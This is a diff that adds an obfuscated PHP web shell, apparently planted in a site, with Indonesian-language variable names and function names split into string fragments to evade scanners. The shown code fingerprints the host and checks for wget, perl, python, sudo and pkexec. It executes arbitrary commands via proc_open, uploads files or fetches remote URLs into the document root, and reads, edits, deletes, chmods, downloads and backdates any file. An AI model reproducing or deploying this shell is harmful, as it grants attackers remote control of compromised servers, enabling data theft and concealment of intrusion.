+		if (empty($d)) {
+			$e = $c($fl);
+			if (empty($e)) {
+				return "?";
+			} else {
+				return $e;
+			}
+		} else {
+			return $d['name'];
+		}
+	} elseif ($a($c)) {
+		return $c($fl);
+	} else {
+		return "?";
+	}
+}
+
+function fdt($fl) {
+	$a = "da"."te";
+	$b = "fil"."emt"."ime";
+    return $a("F d Y H:i:s", $b($fl));
+}
+
+function dunlut($fl) {
+	$a = "fil"."e_exi"."sts";
+	$b = "ba"."sena"."me";
+	$c = "fi"."les"."ize";
+	$d = "read"."fi"."le";
+	if ($a($fl) && isset($fl)) {
+		header('Con'.'tent-Descr'.'iption: Fi'.'le Tra'.'nsfer');
+		header("Conte'.'nt-Control:public");
+		header('Cont'.'ent-Type: a'.'pp'.'licat'.'ion/oc'.'tet-s'.'tream');
+		header('Cont'.'ent-Dis'.'posit'.'ion: at'.'tachm'.'ent; fi'.'lena'.'me="'.$b($fl).'"');
+		header('Exp'.'ires: 0');
+		header("Ex"."pired:0");
+		header('Cac'.'he-Cont'.'rol: must'.'-revali'.'date');
+		header("Cont"."ent-Tran"."sfer-Enc"."oding:bi"."nary");
+		header('Pra'.'gma: pub'.'lic');
+		header('Con'.'ten'.'t-Le'.'ngth: ' .$c($fl));
+		flush();
+		$d($fl);
+		exit;
+	} else {
+		return "Fi"."le Not F"."ound !";
+	}
+}
+
+function komend($kom, $lk) {
+	$x = "pr"."eg_"."mat"."ch";
+	$xx = "2".">"."&"."1";
+	if (!$x("/".$xx."/i", $kom)) {
+		$kom = $kom." ".$xx;
+	}
+	$a = "fu"."ncti"."on_"."ex"."is"."ts";
+	$b = "p"."ro"."c_op"."en";
+	$c = "htm"."lspe"."cialc"."hars";
+	$d = "s"."trea"."m_g"."et_c"."ont"."ents";
+	if ($a($b)) {
+		$ps = $b($kom, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $meki, $lk);
+		return "<pre>".$c($d($meki[1]))."</pre>";
+	} else {
+		return "pr"."oc"."_op"."en f"."unc"."tio"."n i"."s di"."sabl"."ed !";
+	}
+}
+
+function green($text) {
+	echo "<center><font color='green'>".$text."</center></font>";
+}
+
+function red($text) {
+	echo "<center><font color='red'>".$text."</center></font>";
+}
+
+function oren($text) {
+	return "<center><font color='orange'>".$text."</center></font>";
+}
+
+function tuls($nm, $lk) {
+	return "[ <a href='".$lk."'>".$nm."</a> ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
+}
+
+echo "Se"."rv"."er"." I"."P : <font color=gold>".ipsrv()."</font> &nbsp;/&nbsp; Yo"."ur I"."P : <font color=gold>".$_SERVER[$rad]."</font><br>";
+echo "We"."b S"."erv"."er : <font color='gold'>".$_SERVER['SE'.'RV'.'ER_'.'SOF'.'TWA'.'RE']."</font><br>";
+$unm = "ph"."p_u"."na"."me";
+echo "Sys"."tem : <font color='gold'>".@$unm()."</font><br>";
+$gcu = "g"."et_"."curr"."ent"."_us"."er";
+$gmu = "g"."et"."my"."ui"."d";
+echo "Us"."er : <font color='gold'>".@$gcu()."&nbsp;</font>( <font color='gold'>".@$gmu()."</font>)<br>";
+$phv = "ph"."pve"."rsi"."on";
+echo "PH"."P V"."er"."sio"."n : <font color='gold'>".@$phv()."</font><br>";
+echo "Dis"."abl"."e Fu"."nct"."ion : ".$disf."</font><br>";
+echo "MySQL : ";
+if (@$fnct("my"."sql_co"."nne"."ct")) {
+    echo "<font color=green>ON</font>";
+} else {
+    echo "<font color=red>OFF</font>";
+}
+echo " &nbsp;|&nbsp; cURL : ";
+if (@$fnct("cu"."rl"."_in"."it")) {
+    echo "<font color=green>ON</font>";
+} else {
+    echo "<font color=red>OFF</font>";
+}
+echo " &nbsp;|&nbsp; WG"."ET : ";
+if (@$fxt("/"."us"."r/b"."in/w"."get")) {
+    echo "<font color=green>ON</font>";
+} else {
+    echo "<font color=red>OFF</font>";
+}
+echo " &nbsp;|&nbsp; Pe"."rl : ";
+if (@$fxt("/u"."sr/b"."in"."/pe"."rl")) {
+    echo "<font color=green>ON</font>";
+} else {
+    echo "<font color=red>OFF</font>";
+}
+echo " &nbsp;|&nbsp; Pyt"."ho"."n : ";
+if (@$fxt("/"."us"."r/b"."in/p"."ytho"."n2")) {
+    echo "<font color=green>ON</font>";
+} else {
+    echo "<font color=red>OFF</font>";
+}
+echo " &nbsp;|&nbsp; S"."u"."do : ";
+if (@$fxt("/"."us"."r/b"."in/s"."u"."d"."o")) {
+    echo "<font color=green>ON</font>";
+} else {
+    echo "<font color=red>OFF</font>";
+}
+echo " &nbsp;|&nbsp; Pk"."e"."x"."e"."c : ";
+if (@$fxt("/"."us"."r/b"."in/p"."k"."e"."x"."e"."c")) {
+    echo "<font color=green>ON</font>";
+} else {
+    echo "<font color=red>OFF</font>";
+}
+echo "<br>Di"."rect"."ory : &nbsp;";
+
+foreach($_POST as $key => $value){
+	$_POST[$key] = $sts($value);
+}
+
+if(isset($_GET['loknya'])){
+	$lokasi = $_GET['loknya'];
+	$lokdua = $_GET['loknya'];
+} else {
+	$lokasi = $gcw();
+	$lokdua = $gcw();
+}
+
+$lokasi = $srl('\\','/',$lokasi);
+$lokasis = $exp('/',$lokasi);
+$lokasinya = @$scd($lokasi);
+
+foreach($lokasis as $id => $lok){
+	if($lok == '' && $id == 0){
+		$a = true;
+		echo '<a href="?loknya=/">/</a>';
+		continue;
+	}
+	if($lok == '') continue;
+	echo '<a href="?loknya=';
+	for($i=0;$i<=$id;$i++){
+	echo "$lokasis[$i]";
+	if($i != $id) echo "/";
+} 
+echo '">'.$lok.'</a>/';
+}
+
+echo '</td></tr><tr><td><br>';
+if (isset($_POST['upwkwk'])) {
+	if (isset($_POST['berkasnya'])) {
+		if ($_POST['dirnya'] == "2") {
+			$lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
+		}
+		if (empty($_FILES['berkas']['name'])) {
+			echo "<font color=orange>Fi"."le not Se"."lected !</font><br><br>";
+		} else {
+			$data = @$fpt($lokasi."/".$_FILES['berkas']['name'], @$fgt($_FILES['berkas']['tm'.'p_na'.'me']));
+				if ($fxt($lokasi."/".$_FILES['berkas']['name'])) {
+					$fl = $lokasi."/".$_FILES['berkas']['name'];
+					echo "Fi"."le Upl"."oa"."ded ! &nbsp;<font color='gold'><i>".$fl."</i></font><br>";
+					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
+						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
+						echo "Li"."nk : <a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
+					}
+					echo "<br>";
+				} else {
+					echo "<font color='red'>Fa"."ile"."d to Up"."lo"."ad !</font><br><br>";
+			}
+		}
+	} elseif (isset($_POST['linknya'])) {
+		if (empty($_POST['namalink'])) {
+			echo "<font color=orange>Fi"."lename cannot be empty !</font><br><br>";
+		} elseif (empty($_POST['darilink'])) {
+			echo "<font color=orange>Link cannot be empty !</font><br><br>";
+		} else {
+			if ($_POST['dirnya'] == "2") {
+			$lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
+			}
+				$data = @$fpt($lokasi."/".$_POST['namalink'], @$fgt($_POST['darilink']));
+				if ($fxt($lokasi."/".$_POST['namalink'])) {
+					$fl = $lokasi."/".$_POST['namalink'];
+					echo "Fi"."le Uplo"."ade"."d ! &nbsp;<font color='gold'><i>".$fl."</i></font><br>";
+					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
+						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
+						echo "Li"."nk : <a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
+					}
+					echo "<br>";
+				} else {
+					echo "<font color='red'>Fa"."iled to Up"."lo"."ad !</font><br><br>";
+				}
+		}
+	}
+}
+
+echo "Uplo"."ad Fi"."le : ";
+echo '<form enctype="multip'.'art/form'.'-data" method="p'.'ost">
+<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
+<input type="radio" value="2" name="dirnya" >document_root [ '.crt().' ]
+<br>
+<input type="hidden" name="upwkwk" value="aplod">
+<input type="fi'.'le" name="berkas"><input type="submit" name="berkasnya" value="Up'.'load" class="up" style="cursor: pointer; border-color: #fff"><br>
+<input type="text" name="darilink" class="up" placeholder="https://cal'.'lme'.'bat'.'os'.'a'.'y.g'.'it'.'hu'.'b.io/upl'.'oad.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
+</form>';
+echo '<br><form method="post" enctype="application/x-www-form-urlencoded">
+Co'.'mm'.'an'.'d : <input type="text" name="komend" class="up" style="cursor: pointer; border-color: #000" value="'.htmlspecialchars($_POST['komend']).'">
+<input type="submit" name="komends" value=">>" class="up" style="cursor: pointer; border-color: #fff">
+</form>';
+echo "</table><br>";
+
+echo '<hr><center style="font-family: Russo One">';
+echo tuls("HOME", $_SERVER['SC'.'RIP'.'T_N'.'AME']);
+//echo tuls("HOME");
+echo "<hr></center><br>";
+
+if (isset($_GET['lokasie'])) {
+	echo "<tr><td>Current Fi"."le : ".$_GET['lokasie'];
+	echo '</tr></td></table><br/>';
+	echo "<pre>".htmlspecialchars($fgt($_GET['lokasie']))."</pre>";
+	author();
+} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "hapus") {
+	if ($idi($_POST['loknya']) && $fxt($_POST['loknya'])) {
+		xrd($_POST['loknya']);
+		if ($fxt($_POST['loknya'])) {
+			red("Fai"."led to del"."ete Dir"."ec"."tory !");
+		} else {
+			green("Del"."ete Dir"."ect"."ory Suc"."cess !");
+		}
+	} elseif ($ifi($_POST['loknya']) && $fxt($_POST['loknya'])) {
+		@$ulk($_POST['loknya']);
+		if ($fxt($_POST['loknya'])) {
+			red("Failed to Delete Fi"."le !");
+		} else {
+			green("De"."le"."te Fi"."le Succ"."ess !");
+		}
+	} else {
+		red("Fi"."le / Dir"."ecto"."ry not Fo"."und !");
+	}
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
+	if (!isset($_POST['cemod'])) {
+		if ($_POST['ty'.'pe'] == "fi"."le") {
+			echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
+		} else {
+			echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
+		}
+		echo '<form method="post">
+		Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
+		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
+		<input type="hidden" name="pilih" value="ubahmod">';
+		if ($_POST['ty'.'pe'] == "fi"."le") {
+			echo '<input type="hidden" name="type" value="fi'.'le">';;
+		} else {
+			echo '<input type="hidden" name="type" value="di'.'r">';;
+		}
+		echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
+		</form><br>';
+	} else {
+		$cm = @$chm($_POST['loknya'], $ocd($_POST['perm']));
+		if ($cm == true) {
+			green("Change Mod Success !");
+			if ($_POST['ty'.'pe'] == "fi"."le") {
+				echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
+			} else {
+				echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
+			}
+			echo '<form method="post">
+			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
+			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
+			<input type="hidden" name="pilih" value="ubahmod">';
+			if ($_POST['ty'.'pe'] == "fi"."le") {
+				echo '<input type="hidden" name="type" value="fi'.'le">';;
+			} else {
+				echo '<input type="hidden" name="type" value="di'.'r">';;
+			}
+			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
+			</form><br>';
+		} else {
+			red("Change Mod Failed !");
+			if ($_POST['ty'.'pe'] == "fi"."le") {
+				echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
+			} else {
+				echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
+			}
+			echo '<form method="post">
+			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
+			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
+			<input type="hidden" name="pilih" value="ubahmod">';
+			if ($_POST['ty'.'pe'] == "fi"."le") {
+				echo '<input type="hidden" name="type" value="fi'.'le">';;
+			} else {
+				echo '<input type="hidden" name="type" value="di'.'r">';;
+			}
+			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
+			</form><br>';
+		}
+	}
+} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahnama") {
+	if (isset($_POST['gantin'])) {
+		$namabaru = $_GET['loknya']."/".$_POST['newname'];
+		$ceen = "re"."na"."me";
+		if (@$ceen($_POST['loknya'], $namabaru) === true) {
+			green("Change Name Success");
+			if ($_POST['ty'.'pe'] == "fi"."le") {
+				echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
+			} else {
+				echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
+			}
+			echo '<form method="post">
+			New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($_POST['newname']).'" />
+			<input type="hidden" name="loknya" value="'.$_POST['newname'].'">
+			<input type="hidden" name="pilih" value="ubahnama">';
+			if ($_POST['ty'.'pe'] == "fi"."le") {
+				echo '<input type="hidden" name="type" value="fi'.'le">';;
+			} else {
+				echo '<input type="hidden" name="type" value="di'.'r">';;
+			}
+			echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
+			</form><br>';
+		} else {
+			red("Change Name Failed");
+		}
+	} else {
+		if ($_POST['ty'.'pe'] == "fi"."le") {
+			echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
+		} else {
+			echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
+		}
+		echo '<form method="post">
+		New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($bsn($_POST['loknya'])).'" />
+		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
+		<input type="hidden" name="pilih" value="ubahnama">';
+		if ($_POST['ty'.'pe'] == "fi"."le") {
+			echo '<input type="hidden" name="type" value="fi'.'le">';;
+		} else {
+			echo '<input type="hidden" name="type" value="di'.'r">';;
+		}
+		echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
+		</form><br>';
+	}
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
+	if (isset($_POST['gasedit'])) {
+		$edit = @$fpt($_POST['loknya'], $_POST['src']);
+		if ($fgt($_POST['loknya']) == $_POST['src']) {
+			green("Ed"."it Fi"."le Suc"."ce"."ss !");
+		} else {
+			red("Ed"."it Fi"."le Fai"."led !");
+		}
+	}
+	echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br><br>";
+	echo '<form method="post">
+	<textarea cols=80 rows=20 name="src">'.htmlspecialchars($fgt($_POST['loknya'])).'</textarea><br>
+	<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
+	<input type="hidden" name="pilih" value="ed'.'it">
+	<input type="submit" value="Ed'.'it Fi'.'le" name="gasedit" class="up" style="cursor: pointer; border-color: #fff"/>
+	</form><br>';
+} elseif (isset($_POST['komends'])) {
+	if (isset($_POST['komend'])) {
+		if (isset($_GET['loknya'])) {
+			$lk = $_GET['loknya'];
+		} else {
+			$lk = $gcw();
+		}
+		$km = 'ko'.'me'.'nd';
+		echo $km($_POST['komend'], $lk);
+		exit();
+	}
+} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahtanggal") {
+	if (isset($_POST['tanggale'])) {
+		$stt = "st"."rtot"."ime";
+		$tch = "t"."ou"."ch";
+		$tanggale = $stt($_POST['tanggal']);
+		if (@$tch($_POST['loknya'], $tanggale) === true) {
+			green("Change Da"."te Succ"."ess !");
+			$det = "da"."te";
+			$ftm = "fi"."le"."mti"."me";
+			$b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
+			if ($_POST['ty'.'pe'] == "fi"."le") {
+				echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
+			} else {
+				echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
+			}
+			echo '<form method="post">
+			New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
+			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
+			<input type="hidden" name="pilih" value="ubahtanggal">';
+			if ($_POST['ty'.'pe'] == "fi"."le") {
+				echo '<input type="hidden" name="type" value="fi'.'le">';;
+			} else {
+				echo '<input type="hidden" name="type" value="di'.'r">';;
+			}
+			echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
+			</form><br>';
+		} else {
+			red("Fai"."led to Cha"."nge Da"."te !");
+		}
+	} else {
+		$det = "da"."te";
+		$ftm = "fi"."le"."mti"."me";
+		$b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
+		if ($_POST['ty'.'pe'] == "fi"."le") {
+			echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
+		} else {
+			echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
+		}
+		echo '<form method="post">
+		New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
+		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
+		<input type="hidden" name="pilih" value="ubahtanggal">';
+		if ($_POST['ty'.'pe'] == "fi"."le") {
+			echo '<input type="hidden" name="type" value="fi'.'le">';;
+		} else {
+			echo '<input type="hidden" name="type" value="di'.'r">';;
+		}
+		echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
+		</form><br>';
+	}
+} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "dunlut") {
+	$dunlute = $_POST['loknya'];
+	if ($fxt($dunlute) && isset($dunlute)) {
+		if ($ird($dunlute)) {
+			dunlut($dunlute);
+		} elseif ($idr($fl)) {
+			red("That is Di"."rec"."tory, Not Fi"."le -_-");
+		} else {
+			red("Fi"."le is Not Re"."adab"."le !");
+		}
+	} else {
+		red("Fi"."le Not Fo"."und !");
+	}
+} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "fo"."ld"."er") {
+    if ($isw("./") || $ird("./")) {
+        $loke = $_POST['loknya'];
+        if (isset($_POST['buatfolder'])) {
+            $buatf = $mkd($loke."/".$_POST['fo'.'lde'.'rba'.'ru']);
+            if ($buatf == true) {
+                green("Folder <b>".htmlspecialchars($_POST['fo'.'lde'.'rba'.'ru'])."</b> Created !");
+                echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
+                echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
+                <input type="hidden" name="pilih" value="folder"></form>';
+            } else {
+                red("Failed to Create folder !");
+                echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
+                echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
+                <input type="hidden" name="pilih" value="folder"></form>';
+            }
+        } else {
+            echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
+            echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="folder"></form>';
+        }
+    }
+} elseif (isset($_POST['lok'.'nya']) && $_POST['pilih'] == "fi"."le") {
+    if ($isw("./") || $isr("./")) {
+        $loke = $_POST['lok'.'nya'];
+        if (isset($_POST['buatfi'.'le'])) {
+            $buatf = $fpt($loke."/".$_POST['fi'.'lebaru'], "");
+            if ($fxt($loke."/".$_POST['fi'.'lebaru'])) {
+                green("File <b>".htmlspecialchars($_POST['fi'.'lebaru'])."</b> Created !");
+                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
+                echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'">
+                <input type="hidden" name="pilih" value="fi'.'le"></form>';
+            } else {
+                red("Failed to Create File !");
+                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
+                echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'">
+                <input type="hidden" name="pilih" value="fi'.'le"></form>';
+            }
+        } else {
+            echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
+            echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'"><input type="hidden" name="pilih" value="fi'.'le"></form>';
+        }
+    }
+}
+
+echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr class="first">
+<td><center>Na'.'me</center></td>
+<td><center>Si'.'ze</center></td>
+<td><center>Las'.'t Mo'.'dif'.'ied</center></td>
+<td><center>Owner / Group</center></td>
+<td><center>Pe'.'rmi'.'ss'.'ions</center></td>
+<td><center>Op'.'tio'.'ns</center></td>
+</tr>';
+
+echo "<tr>";
+$euybrekw = $srl($bsn($lokasi), "", $lokasi);
+$euybrekw = $srl("//", "/", $euybrekw);
+echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?loknya=".$euybrekw."\">..</a></td>
+<td><center>--</center></td>
+<td><center>".fdt($euybrekw)."</center></td>
+<td><center>".gor($euybrekw)." / ".ggr($euybrekw)."</center></td>
+<td><center>";
+if($isw($euybrekw)) echo '<font color="green">';
+elseif(!$isr($euybrekw)) echo '<font color="red">';
+echo statusnya($euybrekw);
+if($isw($euybrekw) || !$isr($euybrekw)) echo '</font>';
+echo "</center></td>
+<td><center><form method=\"POST\" action=\"?pilihan&loknya=$lokasi\">
+<input type=\"hidden\" name=\"type\" value=\"dir\">
+<input type=\"hidden\" name=\"name\" value=\"$ppkcina\">
+<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$ppkcina\">
+<button type='submit' class='btf' name='pilih' value='folder'><i class='fa fa-folder' style='color: #fff'></i></button>
+<button type='submit' class='btf' name='pilih' value='file'><i class='fa fa-file' style='color: #fff'></i></button>
+</form></center>";
+echo "</tr>";
+
+foreach($lokasinya as $ppkcina){
+	$euybre = $lokasi."/".$ppkcina;
+	$euybre = $srl("//", "/", $euybre);
+	if(!$idi($euybre) || $ppkcina == '.' || $ppkcina == '..') continue;
+	echo "<tr>";
+	echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?loknya=".$euybre."\">".$ppkcina."</a></td>
+	<td><center>--</center></td>
+	<td><center>".fdt($euybre)."</center></td>
+	<td><center>".gor($euybre)." / ".ggr($euybre)."</center></td>
+	<td><center>";
+	if($isw($euybre)) echo '<font color="green">';
+	elseif(!$isr($euybre)) echo '<font color="red">';
+	echo statusnya($euybre);
+	if($isw($euybre) || !$isr($euybre)) echo '</font>';
+
+	echo "</center></td>
+	<td><center><form method=\"POST\" action=\"?pilihan&loknya=$lokasi\">
+	<input type=\"hidden\" name=\"type\" value=\"dir\">
+	<input type=\"hidden\" name=\"name\" value=\"$ppkcina\">
+	<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$ppkcina\">
+	<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
+	<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
+	<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
+	<button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
+	</form></center></td>
+	</tr>";
+}
+
+echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
+$skd = "10"."24";
+foreach($lokasinya as $mekicina) {
+	$euybray = $lokasi."/".$mekicina;
+	if(!$ifi("$lokasi/$mekicina")) continue;
+	$size = $fsz("$lokasi/$mekicina")/$skd;
+	$size = $rd($size,3);
+	if($size >= $skd){
+	$size = $rd($size/$skd,2).' M'.'B';
+} else {
+	$size = $size.' K'.'B';
+}
+
+echo "<tr>
+<td>".cfn($euybray)." <a href=\"?lokasie=$lokasi/$mekicina&loknya=$lokasi\">$mekicina</a></td>
+<td><center>".$size."</center></td>
+<td><center>".fdt($euybray)."</center></td>
+<td><center>".gor($euybray)." / ".ggr($euybray)."</center></td>
+<td><center>";
+if($isw("$lokasi/$mekicina")) echo '<font color="green">';
+elseif(!$isr("$lokasi/$mekicina")) echo '<font color="red">';
+echo statusnya("$lokasi/$mekicina");
+if($isw("$lokasi/$mekicina") || !$isr("$lokasi/$mekicina")) echo '</font>';
+echo "</center></td><td><center>
+<form method=\"post\" action=\"?pilihan&loknya=$lokasi\">
+<button type='submit' class='btf' name='pilih' value='edit'><i class='fa fa-edit' style='color: #fff'></i></button>
+<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
+<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
+<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
+<button type='submit' class='btf' name='pilih' value='dunlut'><i class='fa fa-down"."load' style='color: #fff'></i></button>
+<button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
+<input type=\"hidden\" name=\"type\" value=\"fi"."le\">
+<input type=\"hidden\" name=\"name\" value=\"$mekicina\">
+<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$mekicina\">
+</form></center></td>
+</tr>";
+}
+echo '</tr></td></table></table>';
+author();
+
+function statusnya($fl){
+	$a = "sub"."st"."r";
+	$b = "s"."pri"."ntf";
+	$c = "fil"."eper"."ms";
+$izin = $a($b('%o', $c($fl)), -4);
+return $izin;
+}
 ?>
